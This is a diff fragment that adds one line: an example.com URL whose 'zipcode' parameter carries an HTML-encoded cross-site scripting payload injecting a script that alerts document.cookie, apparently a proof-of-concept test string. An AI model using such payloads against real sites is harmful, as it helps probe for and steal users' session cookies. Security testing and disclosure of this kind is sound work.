@@ -1,0 +1,3 @@
+http://www.example.com/tools/view_map.php?zipcode=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+
+
